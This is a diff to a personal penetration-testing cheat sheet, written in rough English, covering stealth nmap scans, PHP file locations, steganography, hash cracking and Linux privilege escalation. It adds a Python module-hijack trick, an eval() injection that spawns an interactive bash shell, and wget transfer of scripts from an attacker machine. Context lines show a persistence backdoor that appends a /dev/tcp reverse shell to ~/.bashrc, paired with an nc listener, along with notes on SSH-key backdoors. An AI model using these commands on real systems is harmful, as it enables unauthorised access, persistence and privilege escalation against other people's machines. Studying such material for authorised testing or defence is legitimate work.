@@ -52,9 +52,19 @@ sudo nmap -sN -oG NOM_DU_FICHIER <IP address>
 #use -sN for the null Flag and don't be detect by IPS
 ```
 #### 2.2 HTTP/S enumeration
-- port 80 http and port 443 https
-- Inspect source code, request http, cookies, and storage in application,...
-- If a image look suspicious dowload it and use steganography
+I have other cheatcheat only for web exploit  
+**Php server**
+Some common and important location in php server
+```
+db.php
+config.php
+index.php
+login.php
+admin.php
+ressources/*.js
+```
+
+**steganography**
 ```bash
 binwalk <image.jpg>
 #allow to see if a other folder is hide in image / does not work every time
@@ -162,8 +172,6 @@ git clone https://github.com/urbanadventurer/username-anarchy.git
 sudo apt install cupp -y
 cupp -i
 ```
-
-
 #### 3.4 Hashcracking
 - Popular type of hash :
 ```test
@@ -176,8 +184,9 @@ Argon2: Variable-length hash, typically 32-64 characters long, with a salt value
 ```
 - hascat
 ### 4. escalation privilege LINUX
+#### **Basic enumaration**
 - You need to search about kernel version, user and group, services, logs, host directory,.... 
-- see the important location file in documents of this page
+- look to the important location file in documents of this page
 ```bash
 uname -a
 #give name of host and kernel
@@ -200,23 +209,32 @@ git status
 git log
 git show <id_commit>
 ```
-- If user have permission use sudo on python script, you can check if the script have an import, argument,...
+- can automatize enumeration system with [linpeas.sh](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) or [LinEnum.sh](https://github.com/rebootuser/LinEnum)  
+- PSPY64 is a good enumeration system, he permite to check in real time the running processes.  
+#### **Python esca**
+- If user have permission use sudo on python script, you can check if the script have an import, argument,...  
 ```python
 #file name example.py
 import requests
 
 requests.get("http://localhost/test")
-```
-```python
+
 #file name requests.py
 
 def get(a):
    print("you get hacked")
 ```
-Make sure that the requests.py file is in the same directory as your script, or is available in the Python path, so that Python can find it.
+Make sure that the requests.py file is in the same directory as your script, or is available in the Python path, so that Python can find it.  
+**eval()**
+If script python have an eval() and variable isnt sanitarize we can inject malicious commande like this:  
+```python
+a = "__import__('os').system('/bin/bash -i')"
+eval(a)
+```
 ```bash
 export PYTHONPATH=$PYTHONPATH:/path/to/your/module/directory
 ```
+#### **transfer script**
 - for tansfer script or folder with server/attacker machine :
 ```bash
 # Local network
@@ -226,9 +244,7 @@ wget http://<IP address>:<port>/file.txt #download file
 #Don't forget to give permission to execute script
 chmod +x file.sh
 chmod +s file.sh #transfer suid of who execute this chmod cmmd
-```
-- can automatize enumeration system with [linpeas.sh](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) or [LinEnum.sh](https://github.com/rebootuser/LinEnum)
-- PSPY64 is a good enumeration system, he permite to check in real time the running processes. 
+``` 
 #### Backdoor
 - SSH backdoor this consiste at generate ssh keygen and put our public key in /home/user/.shh of your target
 - isn't secret
@@ -259,15 +275,3 @@ echo 'bash -i >& /dev/tcp/<IP>/<port> >&1' >> ~/.bashrc #payload backdoor
 nc -lvnp <port> #on your machine who want connect
 ```
 ### 5. escalation privilege WINDOWS
-## Important tools
-### Burpsuite
- #### 1. intruder
- - allow to brut force with multiple wordlist
- #### 2. repeater
- #### 3. sequencer
- #### 4. comparer
- #### 5. macro
-send a request capture by proxy to modify manuely
-### wireshark
-
-  
